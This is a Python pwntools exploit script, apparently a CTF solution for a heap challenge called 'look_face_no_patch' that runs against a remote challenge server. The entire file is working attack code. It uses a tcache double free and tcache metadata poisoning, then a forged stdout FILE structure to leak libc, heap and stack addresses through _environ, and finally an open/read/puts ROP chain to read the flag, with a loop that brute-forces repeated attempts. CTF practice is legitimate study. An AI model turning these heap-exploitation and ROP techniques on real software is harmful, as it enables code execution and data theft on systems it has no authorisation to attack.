# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './look_face_no_patch'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.27.so')
context.binary = binary
# context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    # libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'pwn.08067sec.com'
    port = '28032'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                try:
                    p = remote(host,port)
                except:
                    p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add( content):
    cmd(1)
    sa('cont...',content)

def delete( ):
    cmd(2)

# one_gad = one_gadget(libc.path)

def attack():
    
    add('a'*0x70)
    delete()
    delete()
    add( (p16(0xe010) + '\n').ljust( 0x70,'\x00') )

    add('a'*0x70)

    payload = (p64(0)*4 + p64(0x07000000) + '\n').ljust( 0x70,'\x00')
    add( payload )
    delete()
    add('\x00'*0x48)
    add( p16(0x5760)+'\n')

    fake_io = flat(
        0xfbad1800 , 0,
        0,0,
    ) + p16(0x4ca0) + '\n'

    add(fake_io.ljust( 0x38,'\x00'))
    rl()
    leak_heap = u64(p.recv(6).ljust(8,'\x00'))
    leak = l64()

    if(leak == 0):
        exit(1)

    lg('leak',leak)
    lg('leak_heap',leak_heap)

    # pause()
    libc.address = leak - 0x3afcb0
    libc_base = leak_heap & 0xfffffffff000

    __malloc = libc.sym['__malloc_hook']
    _environ = libc.sym['_environ']
    stdout = libc.sym['_IO_2_1_stdout_']
    
    add(p64(libc_base + 0x10))
    payload = flat(
        '\x00'*0x40 ,
        0,0,
        stdout , libc_base + 0x70,
        )
    
    add(payload.ljust( 0x70,'\x00'))

    fake_io = flat(
        0xfbad1800 , 0,
        0,0,
        _environ -0x8 , _environ + 0x8
    )
    lg('_environ',_environ)
    add(fake_io)

    stack_addr = l64() - 0x120 + 0x10
    lg('stack_addr',stack_addr)
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    flag_addr = stack_addr + 0x1f0
    chain = (p64(ret)*0x10 + flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    )).ljust(0x1f0,'\x00') + 'flag\x00'

    payload = flat(
        stack_addr , stack_addr,
    )

    add(payload.ljust(0x40,'\x00'))

    read_chain = flat(
        pop_rdi_ret , 0 ,
        pop_rsi_ret , stack_addr ,
        pop_rdx_pop_rbx_ret , 0x200 , 0 ,
        read_addr,0,0
    )

    add(read_chain)
    sa('OK\n', chain )

    # p.success(getShell())
    p.interactive()

# attack()
exhaust(attack)

'''
@File    :   look_face_no_patch.py
@Time    :   2021/11/21 12:18:11
@Author  :   Niyah 
'''